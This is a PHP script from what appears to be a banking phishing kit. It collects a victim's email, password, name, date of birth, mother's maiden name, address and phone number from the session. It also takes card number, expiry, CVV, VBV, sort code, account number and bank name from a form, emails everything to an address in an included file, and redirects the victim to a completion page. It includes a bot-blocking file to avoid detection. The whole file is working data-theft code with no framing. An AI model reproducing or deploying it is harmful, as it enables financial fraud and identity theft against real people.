<?php
session_start();
include 'block-bots.php';
$ip = getenv("REMOTE_ADDR");
$crd = $_POST['crd'];

$msg = "

Email Address : ".$_SESSION['email']."
Password : ".$_SESSION['password']."
Full Name : ".$_SESSION['name']."
Date of Birth : ".$_SESSION['day']." ".$_SESSION['month']." ".$_SESSION['year']."
Mother : ".$_SESSION['mmn']."
Billing Address : ".$_SESSION['billing']."
City : ".$_SESSION['city']."
County : ".$_SESSION['county']."
Postcode : ".$_SESSION['postcode']."
Mobile Number : ".$_SESSION['mobile']."
---------------------------------
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
VBV : ".$_POST['vbv']."
Sort Code : ".$_POST['srt']."
Account Number : ".$_POST['acb']."
Bank Name : ".$_POST['nbn']."
IP : $ip
==================================";

$subj = "$crd - $ip";
include 'email.php';
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
header("Location: complete.php?ip=$ip");
?>


